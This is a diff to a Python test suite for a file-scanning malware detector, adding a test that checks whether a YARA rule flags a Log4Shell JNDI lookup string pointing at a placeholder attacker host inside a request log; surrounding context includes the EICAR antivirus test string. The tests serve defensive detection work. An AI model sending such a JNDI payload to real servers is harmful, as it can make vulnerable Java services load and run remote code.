@@ -153,6 +153,14 @@ def test_dropper_pdf_with_embedded_pe(tmp_path):
 # ---- YARA-dependent (guarded) ------------------------------------------
 
 @pytest.mark.skipif(not YaraAnalyzer.is_available(), reason="yara not installed")
+def test_log4shell_detected(tmp_path):
+    r = _scan(tmp_path, "req.log", b"User-Agent: ${jndi:ldap://evil.example/a}")
+    # A document/log is verdict-capped, but the Critical YARA hit bypasses the cap.
+    assert any("Log4Shell" in f.title for f in r.findings)
+    assert r.verdict >= Verdict.LIKELY_MALICIOUS
+
+
+@pytest.mark.skipif(not YaraAnalyzer.is_available(), reason="yara not installed")
 def test_eicar_detected(tmp_path):
     eicar = (rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!"
              rb"$H+H*")
